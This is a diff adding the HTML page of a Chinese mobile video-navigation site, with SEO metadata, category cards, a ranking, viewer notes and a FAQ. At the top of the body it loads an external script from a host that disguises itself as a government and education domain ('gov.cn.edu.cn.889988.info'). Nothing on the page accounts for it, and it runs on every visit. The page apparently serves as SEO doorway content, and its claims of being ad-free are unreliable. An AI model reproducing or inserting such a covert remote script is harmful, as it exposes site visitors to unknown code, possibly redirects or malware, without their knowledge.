@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>小小影视官网 - 口袋里的电影院：电影/电视剧/动漫/综艺/少儿/短剧 | xiaoxiaoyingshiguanwang-h5</title>
+<meta name="description" content="小小影视官网（xiaoxiaoyingshiguanwang-h5.github.io）是口袋里的电影院：电影、电视剧、动漫、综艺、纪录片、少儿、短剧一屏装下，像素热度榜、小小手记，移动端自适应。">
+<meta name="keywords" content="小小影视官网,口袋影院,电影导航,电视剧导航,动漫导航,综艺导航,少儿动画,短剧导航,xiaoxiaoyingshiguanwang-h5">
+<meta name="author" content="小小影视官网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://xiaoxiaoyingshiguanwang-h5.github.io/">
+<meta property="og:title" content="小小影视官网 - 口袋里的电影院">
+<meta property="og:description" content="电影/电视剧/动漫/综艺/少儿/短剧：一屏装下，像素热度榜，小小手记。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://xiaoxiaoyingshiguanwang-h5.github.io/">
+<meta property="og:site_name" content="小小影视官网">
+<meta name="msvalidate.01" content="BING_VERIFY_CODE">
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"小小影视官网",
+  "url":"https://xiaoxiaoyingshiguanwang-h5.github.io/",
+  "description":"小小影视官网是面向手机用户的轻量影视导航站，覆盖电影、电视剧、动漫、综艺、纪录片、少儿、短剧。"
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"FAQPage",
+  "mainEntity":[
+    {
+      "@type":"Question",
+      "name":"小小影视官网是什么？",
+      "acceptedAnswer":{"@type":"Answer","text":"小小影视官网是一个“口袋里”的影视导航站：不堆长列表，不弹大广告，把电影、电视剧、动漫、综艺、纪录片、少儿、短剧做成糖果色小卡片，手机上单手就能翻。"}
+    },
+    {
+      "@type":"Question",
+      "name":"小小影视官网提供播放或下载吗？",
+      "acceptedAnswer":{"@type":"Answer","text":"不提供侵权片源、不绑播放器下载器。本站只做分类、简介、更新信号和观片手记，帮你在碎片时间快速决定看什么。"}
+    }
+  ]
+}
+</script>
+<style>
+:root{
+  --bg:#f7f7fb;
+  --card:#ffffff;
+  --ink:#1c1c28;
+  --muted:#6b6f86;
+  --blue:#3ea8ff;
+  --orange:#ff8a3d;
+  --pink:#ff5d8f;
+  --mint:#34d399;
+  --line:rgba(60,168,255,.28);
+  --shadow:0 14px 34px rgba(28,28,40,.12);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:
+    radial-gradient(680px 380px at 88% -8%,rgba(255,93,143,.16),transparent 60%),
+    radial-gradient(620px 360px at -8% 6%,rgba(62,168,255,.18),transparent 55%),
+    var(--bg);
+  color:var(--ink);line-height:1.75;
+}
+a{color:inherit;text-decoration:none}
+
+/* 口袋导航 */
+.xx-top{position:sticky;top:0;z-index:999;background:rgba(247,247,251,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.xx-top__in{max-width:1180px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:.7rem 1rem}
+.xx-logo{font-weight:900;font-size:1.18rem}
+.xx-logo b{color:var(--blue)}
+.xx-logo i{color:var(--pink);font-style:normal}
+.xx-nav{display:flex;gap:.3rem}
+.xx-nav a{padding:.45rem .8rem;border-radius:999px;font-size:.9rem;color:var(--muted);font-weight:700}
+.xx-nav a:hover{background:rgba(62,168,255,.14);color:var(--blue)}
+.xx-burger{display:none;flex-direction:column;gap:4px;cursor:pointer}
+.xx-burger span{width:22px;height:2px;background:var(--blue);border-radius:2px}
+
+/* Hero 像素小电视 */
+.xx-hero{max-width:1180px;margin:0 auto;padding:3.2rem 1rem 2.4rem;text-align:center}
+.xx-tv{width:130px;height:104px;margin:0 auto 1.2rem;border-radius:18px;background:var(--ink);position:relative;
+  box-shadow:0 14px 30px rgba(28,28,40,.25);image-rendering:pixelated}
+.xx-tv::before{content:"";position:absolute;inset:10px;border-radius:8px;
+  background:
+    repeating-linear-gradient(0deg,rgba(62,168,255,.5) 0 4px,transparent 4px 8px),
+    repeating-linear-gradient(90deg,rgba(255,138,61,.5) 0 4px,transparent 4px 8px),
+    #10243a}
+.xx-tv::after{content:"";position:absolute;right:-14px;top:38px;width:14px;height:14px;border-radius:50%;background:var(--pink)}
+.xx-hero h1{font-size:clamp(2rem,5vw,3.1rem);line-height:1.2;margin-bottom:1rem}
+.xx-hero h1 em{font-style:normal;color:var(--blue)}
+.xx-hero h1 u{text-decoration:none;color:var(--orange)}
+.xx-hero p{color:var(--muted);max-width:680px;margin:0 auto 1.8rem}
+.xx-cta{display:inline-flex;gap:.5rem;align-items:center;padding:.85rem 1.9rem;border-radius:999px;font-weight:800;color:#fff;background:linear-gradient(90deg,var(--blue),var(--pink));box-shadow:var(--shadow)}
+.xx-dim{color:var(--muted);font-size:.82rem;letter-spacing:2px;font-family:ui-monospace,monospace}
+
+/* 区块 */
+.xx-sec{max-width:1180px;margin:0 auto;padding:3.2rem 1rem}
+.xx-head{margin-bottom:1.8rem;text-align:center}
+.xx-head .no{font-size:.74rem;color:var(--blue);letter-spacing:3px;font-family:ui-monospace,monospace}
+.xx-head h2{font-size:clamp(1.4rem,3.5vw,2.2rem);font-weight:900;margin-top:.3rem}
+.xx-head h2 i{color:var(--pink);font-style:normal}
+.xx-head p{color:var(--muted);margin-top:.35rem;font-size:.94rem}
+
+/* 小小片单 */
+.xx-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:1rem}
+.xx-cell{border-radius:20px;padding:1.3rem 1rem;background:var(--card);text-align:center;transition:.25s;box-shadow:var(--shadow);border:1px solid #eef0f6}
+.xx-cell:hover{transform:translateY(-5px)}
+.xx-cell .ic{font-size:1.9rem}
+.xx-cell h3{font-size:.98rem;margin:.5rem 0 .3rem}
+.xx-cell p{font-size:.74rem;color:var(--muted)}
+
+/* 小小频道 */
+.xx-ch{display:grid;grid-template-columns:repeat(7,1fr);gap:.9rem}
+.xx-c{border-radius:18px;padding:1.1rem .5rem;background:var(--card);text-align:center;border:1px solid #eef0f6;transition:.25s}
+.xx-c:hover{transform:translateY(-4px);box-shadow:var(--shadow)}
+.xx-c .ic{font-size:1.6rem}
+.xx-c h3{font-size:.86rem;margin-top:.35rem}
+.xx-c p{font-size:.68rem;color:var(--muted)}
+
+/* 小小热度榜：像素血条 */
+.xx-rank{display:grid;gap:1.1rem}
+.xx-item{background:var(--card);border:1px solid #eef0f6;border-radius:16px;padding:1.1rem 1.2rem;box-shadow:var(--shadow)}
+.xx-item h3{font-size:1.02rem;display:flex;justify-content:space-between;margin-bottom:.6rem}
+.xx-item h3 span{color:var(--orange)}
+.xx-bar{height:16px;border-radius:6px;background:#eef0f6;overflow:hidden;position:relative;border:2px solid var(--ink)}
+.xx-bar i{display:block;height:100%;
+  background-image:repeating-linear-gradient(90deg,var(--blue) 0 6px,var(--pink) 6px 12px)}
+.xx-bar i::after{content:"🍬";position:absolute;right:4px;top:-3px;font-size:.9rem}
+
+/* 手记 */
+.xx-notes{display:grid;grid-template-columns:1fr 1fr;gap:1.4rem}
+.xx-note{background:var(--card);border:1px solid #eef0f6;border-radius:20px;padding:1.4rem;box-shadow:var(--shadow)}
+.xx-note .tag{font-size:.72rem;padding:.2rem .6rem;border-radius:999px;font-weight:800}
+.xx-note.kid .tag{background:rgba(52,211,153,.18);color:#0f9d6b}
+.xx-note.old .tag{background:rgba(255,138,61,.18);color:#d9651b}
+.xx-note h3{font-size:1.04rem;margin:.6rem 0 .4rem}
+.xx-note p{font-size:.86rem;color:var(--muted)}
+
+/* 关于 */
+.xx-about{background:linear-gradient(160deg,#eaf4ff,#fff0f6);border:1px solid var(--line);border-radius:26px;padding:2.4rem}
+.xx-about h2{font-size:1.9rem;margin-bottom:.8rem}
+.xx-about h2 u{color:var(--blue);text-decoration:none}
+.xx-about p{color:var(--muted);margin-bottom:1rem}
+.xx-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;margin-top:1.4rem}
+.xx-stat{background:var(--card);border:1px solid #eef0f6;border-radius:16px;padding:1.1rem;text-align:center;box-shadow:var(--shadow)}
+.xx-stat b{font-size:1.5rem;color:var(--pink);display:block}
+.xx-stat span{font-size:.8rem;color:var(--muted)}
+
+/* FAQ */
+.xx-faq details{background:var(--card);border:1px solid #eef0f6;border-radius:14px;padding:.2rem 1.1rem;margin-bottom:.7rem;box-shadow:var(--shadow)}
+.xx-faq summary{cursor:pointer;padding:.85rem 0;font-weight:800}
+.xx-faq p{padding:0 0 .85rem;color:var(--muted)}
+
+/* 页脚 */
+.xx-foot{border-top:1px solid var(--line);background:#eef0f6;padding:2.2rem 1rem;text-align:center;color:var(--muted);font-size:.86rem}
+.xx-foot a{color:var(--blue)}
+.xx-foot__links{display:flex;gap:1.1rem;justify-content:center;flex-wrap:wrap;margin-bottom:1rem}
+.xx-foot__links a{font-size:.84rem}
+
+@media(max-width:980px){
+  .xx-grid{grid-template-columns:repeat(3,1fr)}
+  .xx-ch{grid-template-columns:repeat(4,1fr)}
+  .xx-notes{grid-template-columns:1fr}
+}
+@media(max-width:640px){
+  .xx-nav{display:none;position:absolute;top:56px;left:0;right:0;flex-direction:column;gap:0;background:rgba(247,247,251,.98);border-bottom:1px solid var(--line)}
+  .xx-nav.show{display:flex}
+  .xx-nav a{padding:.85rem 1rem;border-bottom:1px solid #eef0f6}
+  .xx-burger{display:flex}
+  .xx-grid{grid-template-columns:repeat(2,1fr)}
+  .xx-ch{grid-template-columns:repeat(3,1fr)}
+  .xx-stats{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="xx-top">
+  <div class="xx-top__in">
+    <div class="xx-logo">📺 小小<b>影视官网</b> <i>·口袋影院</i></div>
+    <nav class="xx-nav" id="xxNav">
+      <a href="#home">口袋</a>
+      <a href="#grid">小小片单</a>
+      <a href="#ch">小小频道</a>
+      <a href="#rank">热度榜</a>
+      <a href="#notes">小小手记</a>
+      <a href="#about">关于官网</a>
+    </nav>
+    <div class="xx-burger" onclick="document.getElementById('xxNav').classList.toggle('show')">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</header>
+
+<section class="xx-hero" id="home">
+  <div class="xx-tv"></div>
+  <p class="xx-dim">// pocket cinema loaded</p>
+  <h1>口袋里的电影院<br><em>小小</em>影视，<u>单手就能翻完</u></h1>
+  <p>小小影视官网不堆长列表、不弹大广告：电影、剧集、动漫、综艺、纪录片、少儿、短剧，做成糖果色小卡片。地铁上、睡前、娃在旁边，都能 10 秒定好今晚看啥。</p>
+  <a class="xx-cta" href="#grid">🍬 打开口袋片库</a>
+</section>
+
+<section class="xx-sec" id="grid">
+  <div class="xx-head">
+    <div class="no">// tiny watch modes</div>
+    <h2>小小 <i>片单</i></h2>
+    <p>不是按“最新”排，是按“你现在有几分钟”排。</p>
+  </div>
+  <div class="xx-grid">
+    <div class="xx-cell"><div class="ic">🚇</div><h3>通勤短剧</h3><p>单集 3-5 分钟，进站出站刚好</p></div>
+    <div class="xx-cell"><div class="ic">🌙</div><h3>陪睡片</h3><p>慢、暖、不吓人，关灯也能听个大概</p></div>
+    <div class="xx-cell"><div class="ic">🛋️</div><h3>周末电影</h3><p>家庭、喜剧、动画电影，沙发局专用</p></div>
+    <div class="xx-cell"><div class="ic">🧒</div><h3>娃在看</h3><p>少儿动画、绘本改、自然纪录片</p></div>
+    <div class="xx-cell"><div class="ic">⏳</div><h3>随手看</h3><p>综艺切片、影评混剪、片头考古</p></div>
+  </div>
+</section>
+
+<section class="xx-sec" id="ch">
+  <div class="xx-head">
+    <div class="no">// seven tiny channels</div>
+    <h2>小小 <i>频道</i></h2>
+    <p>七个圆章，覆盖全家老小和通勤青年。</p>
+  </div>
+  <div class="xx-ch">
+    <div class="xx-c"><div class="ic">🎬</div><h3>电影</h3><p>院线/经典/动画电影</p></div>
+    <div class="xx-c"><div class="ic">📺</div><h3>电视剧</h3><p>国产/韩剧/美剧</p></div>
+    <div class="xx-c"><div class="ic">🍥</div><h3>动漫</h3><p>新番/国创/剧场版</p></div>
+    <div class="xx-c"><div class="ic">🎤</div><h3>综艺</h3><p>选秀/访谈/慢综艺</p></div>
+    <div class="xx-c"><div class="ic">🐳</div><h3>纪录片</h3><p>自然/历史/社会</p></div>
+    <div class="xx-c"><div class="ic">🧸</div><h3>少儿</h3><p>动画/绘本/儿歌</p></div>
+    <div class="xx-c"><div class="ic">⚡</div><h3>短剧</h3><p>甜宠/逆袭/悬疑快剪</p></div>
+  </div>
+</section>
+
+<section class="xx-sec" id="rank">
+  <div class="xx-head">
+    <div class="no">// pixel heat bar</div>
+    <h2>小小 <i>热度榜</i></h2>
+    <p>按“手机端点击 + 看完率 + 收藏进口袋 + 分享给朋友”综合排，不是 PC 播放量。</p>
+  </div>
+  <div class="xx-rank">
+    <div class="xx-item"><h3>1. 陪睡片：海边的小邮局 <span>97%</span></h3><div class="xx-bar"><i style="width:97%"></i></div></div>
+    <div class="xx-item"><h3>2. 通勤短剧：重生从送外卖开始 <span>95%</span></h3><div class="xx-bar"><i style="width:95%"></i></div></div>
+    <div class="xx-item"><h3>3. 娃在看：小蓝的冒险 第 2 季 <span>93%</span></h3><div class="xx-bar"><i style="width:93%"></i></div></div>
+    <div class="xx-item"><h3>4. 周末电影：猫的报恩（4K 重制） <span>91%</span></h3><div class="xx-bar"><i style="width:91%"></i></div></div>
+    <div class="xx-item"><h3>5. 随手看：90 年代片头考古 <span>88%</span></h3><div class="xx-bar"><i style="width:88%"></i></div></div>
+  </div>
+</section>
+
+<section class="xx-sec" id="notes">
+  <div class="xx-head">
+    <div class="no">// tiny viewer notes</div>
+    <h2>小小 <i>手记</i></h2>
+    <p>一边是小朋友视角，一边是老观众视角。</p>
+  </div>
+  <div class="xx-notes">
+    <article class="xx-note kid">
+      <span class="tag">🧒 小朋友视角</span>
+      <h3>“少儿片别讲大道理”</h3>
+      <p>小孩不管你拿过什么奖，只看“这个角色我能不能学”：小蓝摔倒了还笑、鲸鱼会帮人指路、下雨天动物都回家。画面亮一点、语速慢一点，他们就坐住了。</p>
+    </article>
+    <article class="xx-note old">
+      <span class="tag">🧓 老观众视角</span>
+      <h3>“陪睡片要会收尾”</h3>
+      <p>半夜不想被反转吓醒。好陪睡片结尾像盖被子：灯关了、海声来了、主角说“明天再说吧”。小小影视官网把这类片单独捞出来，比搜“治愈电影”准。</p>
+    </article>
+    <article class="xx-note kid">
+      <span class="tag">🧒 小朋友视角</span>
+      <h3>短剧为什么讨小孩喜欢</h3>
+      <p>因为“马上就有结果”：坏人被识破、礼物送到、考试过了。不是浅，是节奏像糖果——一小颗一小颗，不要求你坐牢一样看 40 分钟。</p>
+    </article>
+    <article class="xx-note old">
+      <span class="tag">🧓 老观众视角</span>
+      <h3>通勤片不能占脑子</h3>
+      <p>地铁挤、信号晃、被人撞一下就断。小小影视官网的通勤短剧区，我当“耳朵电影”用：听清对白就行，不用盯字幕也跟得上。</p>
+    </article>
+  </div>
+</section>
+
+<section class="xx-sec" id="about">
+  <div class="xx-about">
+    <h2>关于 <u>小小影视官网</u></h2>
+    <p>
+      小小影视官网（xiaoxiaoyingshiguanwang-h5.github.io）不是“又一个影视大全”，而是一部能塞进口袋的小电视：界面像掌机，分类像糖果，榜单像血条。
+    </p>
+    <p>
+      我们覆盖电影、电视剧、动漫、综艺、纪录片、少儿、短剧，但第一原则是“手机上别累”。你不需要会搜导演、会筛地区、会看豆瓣分——只要说“我现在有几分钟”，小小就递片子过来。
+    </p>
+    <div class="xx-stats">
+      <div class="xx-stat"><b>7 频道</b><span>影/剧/漫/综/纪/少儿/短剧</span></div>
+      <div class="xx-stat"><b>5 模式</b><span>通勤/陪睡/周末/娃看/随手</span></div>
+      <div class="xx-stat"><b>0 大弹窗</b><span>单手就能翻</span></div>
+    </div>
+  </div>
+</section>
+
+<section class="xx-sec xx-faq">
+  <div class="xx-head">
+    <div class="no">// q & a</div>
+    <h2>小小 <i>问答</i></h2>
+  </div>
+  <details open>
+    <summary>小小影视官网和普通影视站有什么不同？</summary>
+    <p>普通站像仓库，分类多、列表长、广告多；小小影视官网像掌机屏，先问“你累不累、有几分钟”，再用小卡片递片。重手机体验，不重 PC 堆量。[3](@ref)</p>
+  </details>
+  <details>
+    <summary>少儿内容会不会混进吓人片子？</summary>
+    <p>小小影视官网把“娃在看”单独成频道，悬疑、恐怖、重口都留在电影/动漫主频道里。少儿区默认只放动画、绘本改、自然纪录片、儿歌类内容。</p>
+  </details>
+  <details>
+    <summary>和天启影视、八戒影视差在哪？</summary>
+    <p>天启是星盘（世界变没变），八戒是院子（人饿不饿、累不累），小小是口袋（手小不小、时间碎不碎）。一个宏大，一个烟火，一个轻巧。</p>
+  </details>
+</section>
+
+<footer class="xx-foot">
+  <div class="xx-foot__links">
+    <a href="#grid">小小片单</a>
+    <a href="#ch">小小频道</a>
+    <a href="#rank">热度榜</a>
+    <a href="#notes">小小手记</a>
+    <a href="#about">关于官网</a>
+    <a href="#">免责声明</a>
+  </div>
+  <p>© 2026 <a href="https://xiaoxiaoyingshiguanwang-h5.github.io">小小影视官网</a> · xiaoxiaoyingshiguanwang-h5.github.io</p>
+  <p>小小影视官网 —— 口袋里的电影院，单手翻完今晚看啥。</p>
+</footer>
+
+<script>
+document.querySelectorAll('.xx-nav a').forEach(function(a){
+  a.addEventListener('click',function(){
+    document.getElementById('xxNav').classList.remove('show');
+  });
+});
+</script>
+
+</body>
+</html>
